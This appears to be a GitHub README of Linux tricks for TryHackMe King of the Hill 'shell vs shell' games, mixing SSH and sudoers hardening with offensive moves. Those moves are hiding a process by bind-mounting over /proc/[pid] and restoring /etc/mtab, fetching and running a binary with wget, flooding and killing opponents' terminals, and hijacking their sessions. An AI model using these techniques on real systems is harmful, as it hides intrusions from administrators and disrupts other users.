# Shell vs Shell
## Linux techniques for shell vs shell in koth

Repository Creator
[![N|Solid](https://trackalerts.com/wp-content/uploads/2020/01/youtube.png)](https://youtube.com/c/MatheuZSecurity)

#### This repository aims to show techniques to be able to use in a shell x shell in koth
# Examples
### Hide your PTS
 if you have an opponent, and he is killing your session, you can become invisible in the machine, you can use this technique to hide on the machine, without needing a rootkit to hide
 
On Linux systems, process management tools like ps or top use the contents of the /proc directory to get a listing of all running processes and the contents of the /proc/[pid] directory for getting more information such as the process name, the command-line arguments or the user/group id of a given process. Since processes may legitimately disappear (terminate) between getting a directory listing of /proc and getting more information about the process, these tools will silently ignore empty directories in /proc. This can be exploited for hiding malicious processes by mounting something else (such as another directory with mount --bind) to /proc/[pid] to hide a given process from the system administrator. While this trick is not new and we were not the first team to use it in the Hacking Contest, we did find a new way of hiding the additional mounts from the system administrator. Typically an administrator will use the "mount" command without any parameters to get a list of all current mounts of the system. One team has already used the alias feature of the shell to manipulate the "mount" command so that it doesn't display the additional mounts inside /proc/.

Since the "mount" command only uses the file /etc/mtab and not /proc/mounts (which is provided by the kernel and can't easily be spoofed), we can also hide the additional mounts by saving a backup of /etc/mtab and restoring it after doing the additional mounts: (https://www.jakoblell.com/blog/2014/05/07/hacking-contest-process-hiding-with-mount/)
```
To hide pid:

echo $$
cp /etc/mtab /tmp/mtab
mount --bind /tmp /proc/[$PID]
mv /tmp/mtab /etc/mtab

```

there where it is written PID, you will put your PID there, for example you can use ps aux to get the PID of your PTS, and using this command you will be invisible, and your opponent will not be able to kill your session

## Fixing vulnerabilities

to protect the machine from other opponents it is very important to check if in /etc/sudoers any user is running some binary with root permission, for example

```
# User privilege specification
root ALL=(ALL=ALL) ALL
teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
``` 
here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there
```
root ALL=(ALL=ALL) ALL
```
and it will be like that, so there will be no way to climb privilege by su and git

## Protecting SSH
if any user changed the root password for example you can lock it so that it doesn't log in directly as root using ssh

> nano /etc/ssh/sshd_config

in this configuration, you will go to "PermitRootLogin" and
set it to "no"

> PermitRootLogin no

you can also put which users can connect to the server, for example if you are already malicious, you can create a user of your own and put root permissions, and define so that only you can connect to the server, but I recommend that you don't do that , do this only in private rooms with your friends.
> nano /etc/ssh/sshd_config

> AllowUsers user1 user2

## Change default SSH port

you can change the default ssh port and for example put it on a high port like 55999

> nano /etc/ssh/sshd_config

```
Include /etc/ssh/sshd_config.d/*.conf

Port 55999
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
```
> service sshd restart 

#### You can also set a limit on the number of authentication attempts and it can help prevent brute force attacks

> sudo nano /etc/ssh/sshd_config

arrive at the option “#MaxAuthTries 0” remove the # , and change it to the desired value, for example 3 attempts

> MaxAuthTries 3

Then save and restart

> sudo systemctl restart sshd

#### You can also remove the private key and public key from users, for example
> rm /home/user1/.ssh/id_rsa

> rm /home/user1/.ssh/id_rsa.pub

#### You can also generate other ssh keys for the user

> ssh-keygen -t rsa

#### Many people use the recent vulnerability (Polkit) to escalate privileges, you can make it a bit more difficult by patching it.

> chmod 0755 /usr/bin/pkexec

## Chattr

in koth, it is forbidden to change the permission of binaries, for example give a chmod 700 /usr/bin/find, except chattr, the chattr binary that you can remove from the machine ( remove from the machine after you use: chattr +i king. txt), rm /usr/bin/chattr, so no one will be able to change the attributes of king.txt

- but if you have access to a koth box and you don't have chattr you can get a chattr binary from github and compile it on the machine and use

> wget https://raw.githubusercontent.com/posborne/linux-programming-interface-exercises/master/15-file-attributes/chattr.c

> gcc chattr.c -o chattr

> ./chattr +i king.txt

and so you can upload that binary on the koth machine, or even upload chattr.c on the machine and compile the binary, so you can use

#### if you're like me and you like to troll your opponents, here are some really cool things you can use to make fun of your friends

#### For you to know who is on the machine, just use the following commands.

> ps aux | grep pts

> who

> w

# Nyancat

> git clone https://github.com/klange/nyancat

> cd nyancat/src

> make

#### Sending Nyancat to machine

> python -m SimpleHTTPServer <Port> # on your local machine

> wget http://yourip/nyancat # on the KOTH machine

> chmod +x nyancat

> ./nyancat > /dev/pts/# < here where is the # you will place the enemy

#### Breaking pts by sending spam from urandom

> cat /dev/urandom > /dev/pts/#

#### killing session of a user logged into ssh/system
> pkill -9 -t pts/#

#### breaking into the shell of users logged into SSH

you can use the following command to break into the shell of other logged in users

> script -f /dev/pts/#

## Note

Don't do anything wrong on the koth machines, please respect all the rules for everyone to have a great experience and a great game

https://docs.tryhackme.com/docs/koth/king-of-the-hill

# more content here soon!
